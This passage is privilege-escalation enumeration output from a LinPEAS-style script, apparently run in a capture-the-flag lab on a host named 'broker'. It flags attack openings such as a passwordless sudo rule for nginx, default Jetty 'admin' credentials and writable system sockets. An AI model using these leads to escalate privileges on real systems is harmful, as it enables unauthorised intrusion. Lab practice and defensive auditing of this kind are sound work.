Thu 2025-05-15 02:50:18 UTC 9h left       Thu 2023-04-27 16:07:06 UTC 2 years 0 months ago man-db.timer                   man-db.service
Thu 2025-05-15 03:36:31 UTC 10h left      Thu 2023-04-27 16:07:06 UTC 2 years 0 months ago fwupd-refresh.timer            fwupd-refresh.service
Thu 2025-05-15 05:44:29 UTC 12h left      Thu 2023-04-27 16:07:06 UTC 2 years 0 months ago update-notifier-motd.timer     update-notifier-motd.service
Thu 2025-05-15 17:13:48 UTC 23h left      Wed 2025-05-14 17:13:48 UTC 16min ago            update-notifier-download.timer update-notifier-download.service
Thu 2025-05-15 17:23:29 UTC 23h left      Wed 2025-05-14 17:23:29 UTC 6min ago             systemd-tmpfiles-clean.timer   systemd-tmpfiles-clean.service
Sun 2025-05-18 03:10:27 UTC 3 days left   Wed 2025-05-14 17:09:08 UTC 21min ago            e2scrub_all.timer              e2scrub_all.service
n/a                         n/a           n/a                         n/a                  apport-autoreport.timer        apport-autoreport.service
n/a                         n/a           n/a                         n/a                  ua-timer.timer                 ua-timer.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services
/etc/systemd/system/multi-user.target.wants/grub-common.service could be executing some relative path
/etc/systemd/system/multi-user.target.wants/systemd-networkd.service could be executing some relative path
/etc/systemd/system/sleep.target.wants/grub-common.service could be executing some relative path
You can't write on systemd PATH

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/usr/lib/systemd/system/dbus.socket is calling this writable listener: /run/dbus/system_bus_socket
/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /run/dbus/system_bus_socket
/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets
sed: -e expression #1, char 0: no previous regular expression
/org/kernel/linux/storage/multipathd
/run/dbus/system_bus_socket
  └─(Read Write)
/run/irqbalance/irqbalance747.sock
  └─(Read )
/run/lvm/lvmpolld.socket
/run/systemd/fsck.progress
/run/systemd/inaccessible/sock
/run/systemd/io.system.ManagedOOM
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/io.systemd.journal
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/systemd/resolve/io.systemd.Resolve
  └─(Read Write)
/run/systemd/userdb/io.systemd.DynamicUser
  └─(Read Write)
/run/udev/control
/run/uuidd/request
  └─(Read Write)
/run/vmware/guestServicePipe
  └─(Read Write)
/var/run/vmware/guestServicePipe
  └─(Read Write)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus
NAME                           PID PROCESS USER             CONNECTION    UNIT SESSION DESCRIPTION
:1.0                           479 n/a     systemd-timesync :1.0          -    -       -
:1.1                           532 n/a     systemd-resolve  :1.1          -    -       -
:1.19                         6569 busctl  activemq         :1.19         -    -       -
:1.2                           502 n/a     systemd-network  :1.2          -    -       -
:1.3                           749 n/a     root             :1.3          -    -       -
:1.4                           752 n/a     root             :1.4          -    -       -
:1.5                             1 n/a     root             :1.5          -    -       -
:1.6                           751 n/a     root             :1.6          -    -       -
:1.7                           784 n/a     root             :1.7          -    -       -
:1.9                           748 n/a     root             :1.9          -    -       -
com.ubuntu.SoftwareProperties    - -       -                (activatable) -    -       -
org.freedesktop.DBus             1 n/a     root             -             -    -       -
org.freedesktop.ModemManager1  784 n/a     root             :1.7          -    -       -
org.freedesktop.PackageKit       - -       -                (activatable) -    -       -
org.freedesktop.PolicyKit1     749 n/a     root             :1.3          -    -       -
org.freedesktop.UDisks2        752 n/a     root             :1.4          -    -       -
org.freedesktop.UPower           - -       -                (activatable) -    -       -
org.freedesktop.bolt             - -       -                (activatable) -    -       -
org.freedesktop.fwupd            - -       -                (activatable) -    -       -
org.freedesktop.hostname1        - -       -                (activatable) -    -       -
org.freedesktop.locale1          - -       -                (activatable) -    -       -
org.freedesktop.login1         751 n/a     root             :1.6          -    -       -
org.freedesktop.network1       502 n/a     systemd-network  :1.2          -    -       -
org.freedesktop.resolve1       532 n/a     systemd-resolve  :1.1          -    -       -
org.freedesktop.systemd1         1 n/a     root             :1.5          -    -       -
org.freedesktop.thermald         - -       -                (activatable) -    -       -
org.freedesktop.timedate1        - -       -                (activatable) -    -       -
org.freedesktop.timesync1      479 n/a     systemd-timesync :1.0          -    -       -
╔══════════╣ D-Bus config files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)

                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Interfaces
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.224.175  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:fe94:fd4  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:fe94:fd4  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:0f:d4  txqueuelen 1000  (Ethernet)
        RX packets 4549  bytes 1185901 (1.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1250  bytes 272458 (272.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 859  bytes 115199 (115.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 859  bytes 115199 (115.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

╔══════════╣ Hostname, hosts and DNS
broker
127.0.0.1 localhost
127.0.1.1 broker

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0 trust-ad
search .

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::38599                :::*                    LISTEN      943/java            
tcp6       0      0 :::5672                 :::*                    LISTEN      943/java            
tcp6       0      0 :::8161                 :::*                    LISTEN      943/java            
tcp6       0      0 :::1883                 :::*                    LISTEN      943/java            
tcp6       0      0 :::61616                :::*                    LISTEN      943/java            
tcp6       0      0 :::61613                :::*                    LISTEN      943/java            
tcp6       0      0 :::61614                :::*                    LISTEN      943/java            
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No

                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens
ptrace protection is enabled (1)

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
activemq:x:1000:1000:,,,:/home/activemq:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
uid=101(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=102(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=103(messagebus) gid=104(messagebus) groups=104(messagebus)
uid=104(systemd-timesync) gid=105(systemd-timesync) groups=105(systemd-timesync)
uid=105(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=106(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(syslog) gid=113(syslog) groups=113(syslog),4(adm)
uid=108(uuidd) gid=114(uuidd) groups=114(uuidd)
uid=109(tcpdump) gid=115(tcpdump) groups=115(tcpdump)
uid=110(tss) gid=116(tss) groups=116(tss)
uid=111(landscape) gid=117(landscape) groups=117(landscape)
uid=112(fwupd-refresh) gid=118(fwupd-refresh) groups=118(fwupd-refresh)
uid=113(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=998(_laurel) gid=998(_laurel) groups=998(_laurel)
uid=999(lxd) gid=100(users) groups=100(users)

╔══════════╣ Login now
 17:30:29 up 22 min,  0 users,  load average: 0.14, 0.05, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
reboot   system boot  Wed May 14 17:08:31 2025   still running                         0.0.0.0

wtmp begins Wed May 14 17:08:31 2025

╔══════════╣ Last time logon each user
Username         Port     From             Latest

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!

                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/curl
/usr/bin/gcc
/usr/bin/nc
/usr/bin/netcat
/usr/bin/perl
/usr/bin/ping
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  gcc                                   4:11.2.0-1ubuntu1                       amd64        GNU C compiler
ii  gcc-11                                11.4.0-1ubuntu1~22.04                   amd64        GNU C compiler
ii  rpcsvc-proto                          1.4.2-0ubuntu6                          amd64        RPC protocol compiler and definitions
/usr/bin/gcc

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: apache2 Not Found
httpd Not Found

Nginx version: 
══╣ Nginx modules
ngx_http_echo_module.so
ngx_http_geoip2_module.so
ngx_stream_module.so
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Nov  6  2023 /etc/nginx/sites-enabled
drwxr-xr-x 2 root root 4096 Nov  6  2023 /etc/nginx/sites-enabled
lrwxrwxrwx 1 root root 34 Nov  5  2023 /etc/nginx/sites-enabled/default -> /etc/nginx/sites-available/default
server {
    listen 80;
    server_name  admin.broker.htb;
    location / {
        proxy_pass http://localhost:8161;
    }
}

-rw-r--r-- 1 root root 1447 May 30  2023 /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
	worker_connections 768;
}
http {
	sendfile on;
	tcp_nopush on;
	types_hash_max_size 2048;
	include /etc/nginx/mime.types;
	default_type application/octet-stream;
	ssl_prefer_server_ciphers on;
	access_log /var/log/nginx/access.log;
	error_log /var/log/nginx/error.log;
	gzip on;
	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}

-rw-r--r-- 1 root root 389 May 30  2023 /etc/default/nginx

-rwxr-xr-x 1 root root 4579 May 30  2023 /etc/init.d/nginx

-rw-r--r-- 1 root root 329 May 30  2023 /etc/logrotate.d/nginx

drwxr-xr-x 8 root root 4096 Nov  6  2023 /etc/nginx
-rw-r--r-- 1 root root 1447 May 30  2023 /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
	worker_connections 768;
}
http {
	sendfile on;
	tcp_nopush on;
	types_hash_max_size 2048;
	include /etc/nginx/mime.types;
	default_type application/octet-stream;
	ssl_prefer_server_ciphers on;
	access_log /var/log/nginx/access.log;
	error_log /var/log/nginx/error.log;
	gzip on;
	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}
-rw-r--r-- 1 root root 217 May 30  2023 /etc/nginx/snippets/snakeoil.conf
ssl_certificate /etc/ssl/certs/ssl-cert-snakeoil.pem;
ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
-rw-r--r-- 1 root root 423 May 30  2023 /etc/nginx/snippets/fastcgi-php.conf
fastcgi_split_path_info ^(.+?\.php)(/.*)$;
try_files $fastcgi_script_name =404;
set $path_info $fastcgi_path_info;
fastcgi_param PATH_INFO $path_info;
fastcgi_index index.php;
include fastcgi.conf;
-rw-r--r-- 1 root root 1125 May 30  2023 /etc/nginx/fastcgi.conf
fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;
fastcgi_param  QUERY_STRING       $query_string;
fastcgi_param  REQUEST_METHOD     $request_method;
fastcgi_param  CONTENT_TYPE       $content_type;
fastcgi_param  CONTENT_LENGTH     $content_length;
fastcgi_param  SCRIPT_NAME        $fastcgi_script_name;
fastcgi_param  REQUEST_URI        $request_uri;
fastcgi_param  DOCUMENT_URI       $document_uri;
fastcgi_param  DOCUMENT_ROOT      $document_root;
fastcgi_param  SERVER_PROTOCOL    $server_protocol;
fastcgi_param  REQUEST_SCHEME     $scheme;
fastcgi_param  HTTPS              $https if_not_empty;
fastcgi_param  GATEWAY_INTERFACE  CGI/1.1;
fastcgi_param  SERVER_SOFTWARE    nginx/$nginx_version;
fastcgi_param  REMOTE_ADDR        $remote_addr;
fastcgi_param  REMOTE_PORT        $remote_port;
fastcgi_param  REMOTE_USER        $remote_user;
fastcgi_param  SERVER_ADDR        $server_addr;
fastcgi_param  SERVER_PORT        $server_port;
fastcgi_param  SERVER_NAME        $server_name;
fastcgi_param  REDIRECT_STATUS    200;
lrwxrwxrwx 1 root root 55 Nov  5  2023 /etc/nginx/modules-enabled/50-mod-http-geoip2.conf -> /usr/share/nginx/modules-available/mod-http-geoip2.conf
load_module modules/ngx_http_geoip2_module.so;
lrwxrwxrwx 1 root root 53 Nov  5  2023 /etc/nginx/modules-enabled/50-mod-http-echo.conf -> /usr/share/nginx/modules-available/mod-http-echo.conf
load_module modules/ngx_http_echo_module.so;
lrwxrwxrwx 1 root root 50 Nov  5  2023 /etc/nginx/modules-enabled/50-mod-stream.conf -> /usr/share/nginx/modules-available/mod-stream.conf
load_module modules/ngx_stream_module.so;

-rw-r--r-- 1 root root 374 May 30  2023 /etc/ufw/applications.d/nginx

drwxr-xr-x 3 root root 4096 Nov  5  2023 /usr/lib/nginx

-rwxr-xr-x 1 root root 1170472 May 30  2023 /usr/sbin/nginx

drwxr-xr-x 2 root root 4096 Nov  6  2023 /usr/share/doc/nginx

drwxr-xr-x 4 root root 4096 Nov  5  2023 /usr/share/nginx
-rw-r--r-- 1 root root 47 May 30  2023 /usr/share/nginx/modules-available/mod-http-geoip2.conf
load_module modules/ngx_http_geoip2_module.so;
-rw-r--r-- 1 root root 42 May 30  2023 /usr/share/nginx/modules-available/mod-stream.conf
load_module modules/ngx_stream_module.so;
-rw-r--r-- 1 root root 45 May 30  2023 /usr/share/nginx/modules-available/mod-http-echo.conf
load_module modules/ngx_http_echo_module.so;

drwxr-xr-x 7 root root 4096 Nov  5  2023 /var/lib/nginx
find: '/var/lib/nginx/proxy': Permission denied
find: '/var/lib/nginx/fastcgi': Permission denied
find: '/var/lib/nginx/uwsgi': Permission denied
find: '/var/lib/nginx/body': Permission denied
find: '/var/lib/nginx/scgi': Permission denied

drwxr-xr-x 2 root adm 4096 May 14 17:08 /var/log/nginx

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Oct 11  2022 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Nov  6  2023 /etc/pam.d
-rw-r--r-- 1 root root 2133 Nov 23  2022 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open

╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Nov  6  2023 /etc/ldap

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Nov  6  2023 /etc/apt/keyrings
drwxr-xr-x 2 root root 4096 Nov  6  2023 /usr/share/keyrings

╔══════════╣ Analyzing FastCGI Files (limit 70)
-rw-r--r-- 1 root root 1055 May 30  2023 /etc/nginx/fastcgi_params

╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 761 Nov 15  2021 /usr/share/bash-completion/completions/postfix

╔══════════╣ Analyzing DNS Files (limit 70)
-rw-r--r-- 1 root root 826 Nov 15  2021 /usr/share/bash-completion/completions/bind
-rw-r--r-- 1 root root 826 Nov 15  2021 /usr/share/bash-completion/completions/bind

╔══════════╣ Analyzing Jetty Files (limit 70)
-rw-r--r-- 1 activemq activemq 1087 Apr 20  2021 /opt/apache-activemq-5.15.15/conf/jetty-realm.properties
admin: admin, admin
user: user, user

╔══════════╣ Analyzing Interesting logs Files (limit 70)
-rw-r--r-- 1 root root 6234 May 14 17:11 /var/log/nginx/access.log

-rw-r--r-- 1 root root 0 May 14 17:08 /var/log/nginx/error.log

╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Jan  6  2022 /etc/skel/.bashrc
-rw-r--r-- 1 activemq activemq 3771 Nov  5  2023 /home/activemq/.bashrc

-rw-r--r-- 1 root root 807 Jan  6  2022 /etc/skel/.profile
-rw-r--r-- 1 activemq activemq 807 Nov  5  2023 /home/activemq/.profile

╔══════════╣ Analyzing FreeIPA Files (limit 70)
drwxr-xr-x 2 root root 4096 Nov  6  2023 /usr/src/linux-headers-5.15.0-88/drivers/net/ipa

╔══════════╣ Searching mysql credentials and exec

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 2794 Mar 26  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Mar 26  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 2899 Jul  4  2022 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 3023 Mar 26  2021 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 1150 Sep 11  2023 /usr/share/keyrings/ubuntu-pro-anbox-cloud.gpg
-rw-r--r-- 1 root root 2247 Sep 11  2023 /usr/share/keyrings/ubuntu-pro-cc-eal.gpg
-rw-r--r-- 1 root root 2274 Sep 11  2023 /usr/share/keyrings/ubuntu-pro-cis.gpg
-rw-r--r-- 1 root root 2236 Sep 11  2023 /usr/share/keyrings/ubuntu-pro-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Sep 11  2023 /usr/share/keyrings/ubuntu-pro-esm-infra.gpg
-rw-r--r-- 1 root root 2275 Sep 11  2023 /usr/share/keyrings/ubuntu-pro-fips.gpg
-rw-r--r-- 1 root root 2250 Sep 11  2023 /usr/share/keyrings/ubuntu-pro-realtime-kernel.gpg
-rw-r--r-- 1 root root 2235 Sep 11  2023 /usr/share/keyrings/ubuntu-pro-ros.gpg
-rw-r--r-- 1 root root 2236 Apr 27  2023 /var/lib/ubuntu-advantage/apt-esm/etc/apt/trusted.gpg.d/ubuntu-advantage-esm-apps.gpg

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)

-rw-r--r-- 1 root root 601 Apr 27  2023 /etc/ssh/ssh_host_dsa_key.pub
-rw-r--r-- 1 root root 173 Apr 27  2023 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 93 Apr 27  2023 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 565 Apr 27  2023 /etc/ssh/ssh_host_rsa_key.pub

PermitRootLogin yes
UsePAM yes
══╣ Some certificates were found (out limited):
/etc/pki/fwupd-metadata/LVFS-CA.pem
/etc/pki/fwupd/LVFS-CA.pem
/etc/pollinate/entropy.ubuntu.com.pem
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM_SERVIDORES_SEGUROS.pem
/etc/ssl/certs/ANF_Secure_Server_Root_CA.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068_2.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
1115PSTORAGE_CERTSBIN

══╣ Writable ssh and gpg agents
/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
/etc/systemd/user/sockets.target.wants/gpg-agent.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket
══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config
Include /etc/ssh/sshd_config.d/*.conf
KbdInteractiveAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem	sftp	/usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow

Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-shell-sessions
tmux 3.2a

/tmp/tmux-1000

                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwsr-xr-x 1 root root 40K Nov 24  2022 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 71K Nov 24  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K Feb 21  2022 /usr/bin/su
-rwsr-xr-x 1 root root 35K Feb 21  2022 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 44K Nov 24  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 35K Mar 23  2022 /usr/bin/fusermount3
-rwsr-xr-x 1 root root 227K Apr  3  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 59K Nov 24  2022 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 47K Feb 21  2022 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 72K Nov 24  2022 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-- 1 root messagebus 35K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 331K Aug 24  2023 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 19K Feb 26  2022 /usr/libexec/polkit-agent-helper-1

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwxr-sr-x 1 root tty 23K Feb 21  2022 /usr/bin/wall
-rwxr-sr-x 1 root _ssh 287K Aug 24  2023 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 23K Feb 21  2022 /usr/bin/write.ul (Unknown SGID binary)
-rwxr-sr-x 1 root shadow 23K Nov 24  2022 /usr/bin/expiry
-rwxr-sr-x 1 root crontab 39K Mar 23  2022 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 71K Nov 24  2022 /usr/bin/chage
-rwxr-sr-x 1 root utmp 15K Mar 24  2022 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 27K Feb  2  2023 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 23K Feb  2  2023 /usr/sbin/pam_extrausers_chkpwd

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls
files with acls in searched folders Not Found

╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities
══╣ Current shell capabilities
CapInh:  0x0000000000000000=
CapPrm:  0x0000000000000000=
CapEff:	 0x0000000000000000=
